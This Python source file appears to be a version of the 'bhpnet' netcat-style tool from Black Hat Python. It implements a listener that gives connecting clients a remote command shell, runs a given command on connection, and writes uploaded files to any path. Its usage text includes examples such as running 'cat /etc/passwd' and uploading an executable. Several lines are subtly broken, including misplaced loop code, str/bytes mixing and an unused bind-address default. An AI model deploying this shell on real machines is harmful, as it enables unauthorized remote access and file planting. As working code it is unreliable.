import sys
import socket
import getopt
import threading
import subprocess

LISTEN      = False
COMMAND     = False
UPLOAD      = False
EXECUTE     = ""
TARGET      = "" 
UPLOAD_DST  = ""
PORT        = 0

def usage():
    print("BNP Net Tool\n")
    print("Usage: bhpnet.py -t target_host -p port")
    print("\t-l --listen              - listen on [host]:[port] for incomming connections")
    print("\t-e --execute=file_to_run - Execute the given file upon receiving a connection")
    print("\t-c --command             - Initialize a command shell")
    print("\t-u --upload=destination  - Upon receiving connection upload a file and write to [destination]\n\n")
    print("Examples:")
    print("\t" + "bhpnet.py -t 192.168.0.1 -p 5555 -l -c")
    print("\t" + r"bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe")
    print("\t" + r'bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd"')
    print("\t" + "echo 'ABCDEFGHI' | .bhpnet.py -t 192.168.11.12 -p 135")
    sys.exit(0)

def client_sender(buffer):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        # Connect to target host
        client.connect((TARGET, PORT))
        if len(buffer):
            client.send(buffer)
        while True:
            # Wait for incomming data
            recv_len = 1
            response = ""
            while recv_len:
                data = client.recv(4096)
                recv_len = len(data)
                response += data
                if recv_len < 4096:
                    break
        print(response)
        # Wait for more input
        buffer = input("")
        buffer += "\n"
        # Send it off
        client.send(buffer)
    except:
        print("[*] Exception! Exiting..")
        # Tear down the connection
        client.close()

def server_loop():
    global TARGET
    # If no target is defined, listen on all interfaces
    if not len(TARGET):
        target = "0.0.0.0"
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((TARGET, PORT))
    server.listen(5)
    while True:
        client_socket, addr = server.accept()
        # Spin off a thread to handle our new client
        client_thread = threading.Thread(target=client_handler, args=(client_socket,))
        client_thread.start()

def run_command(command):
    # Trim the newline
    command = command.rstrip()
    # Run the command and return the output
    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
    except:
        output = "Failed to execute command.\r\n"
    # Send output back to client
    return output

def client_handler(client_socket):
    global UPLOAD
    global EXECUTE
    global COMMAND
    # Check for upload
    if len(UPLOAD_DST):
        # Read in all of the bytes and write to the destination
        file_buffer = ""
        # Keep reading data until none is available
        while True:
            data = client_socket.recv(1024)
            if not data:
                break
            else:
                file_buffer += data
        # Take the bytes and try to write them out
        try:
            file_descriptor = open(UPLOAD_DST, "wb")
            file_descriptor.write(file_buffer)
            file_descriptor.close()
            # Acknowlege that we wrote the file out
            client_socket.send(f"Successfully saved file to {UPLOAD_DST}")
        except:
            client_socket.send(f"Failed to save file to {UPLOAD_DST}")
    # Check for command execution
    if len(EXECUTE):
        # Run command
        output = run_command(EXECUTE)
        client_socket.send(output)
    # If a command shell was requested
    if COMMAND:
        while True:
            # Show a simple prompt
            client_socket.send("<BHP:#> ")
            # Receive until we see a linefeed (enter key)
            cmd_buffer = ""
            while "\n" not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024)
            # Send back the command output
            response = run_command(cmd_buffer)
            # Send back the response
            client_socket.send(response)

def main():
    global LISTEN
    global PORT
    global EXECUTE
    global COMMAND
    global UPLOAD_DST
    global TARGET

    if not len(sys.argv[1::]):
        usage()

    # Read commandline options
    try:
        opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu", 
        ["help", "listen", "execute", "target", "port", "command", "upload"])
    except getopt.GetoptError as err:
        print(str(err))
        usage()

    for o, a in opts:
        if o in ("-h", "--help"):
            usage()
        elif o in ("-l", "--listen"):
            LISTEN = True
        elif o in ("-e", "--execute"):
            EXECUTE = a
        elif o in ("-c", "--commandshell"):
            COMMAND = True
        elif o in ("-u", "--upload"):
            UPLOAD_DST = a
        elif o in ("-t", "--target"):
            TARGET = a
        elif o in ("-p", "--port"):
            PORT = int(a)
        else:
            assert False, "Unhandled Option"
    
    # Check to listen or send data from stdin
    if not LISTEN and len(TARGET) and PORT > 0:
        # Read in the buffer from the commandline
        # This will block, so send CTRL-D if not sending input to stdin
        buffer = sys.stdin.read()
        # Send data off
        client_sender(buffer)
    # Listen and potentially upload things, execute commands, and drop a shell back depending on the commandline options above
    if LISTEN:
        server_loop()


main()